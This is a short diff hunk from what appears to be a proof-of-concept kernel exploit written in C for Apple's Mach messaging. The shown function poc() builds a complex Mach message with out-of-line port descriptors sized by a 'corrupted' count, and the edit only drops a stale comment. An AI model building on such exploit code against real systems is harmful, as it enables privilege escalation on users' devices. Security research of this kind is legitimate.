@@ -89,7 +89,7 @@ void poc() {
     
     msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
     msg->hdr.msgh_size = (mach_msg_size_t)(sizeof(struct ool_msg) + sizeof(mach_msg_ool_ports_descriptor_t) * N_CORRUPTED);
-    msg->hdr.msgh_remote_port = 0;// dest[i];
+    msg->hdr.msgh_remote_port = 0;
     msg->hdr.msgh_local_port = MACH_PORT_NULL;
     msg->hdr.msgh_id = 0x41414141;
     
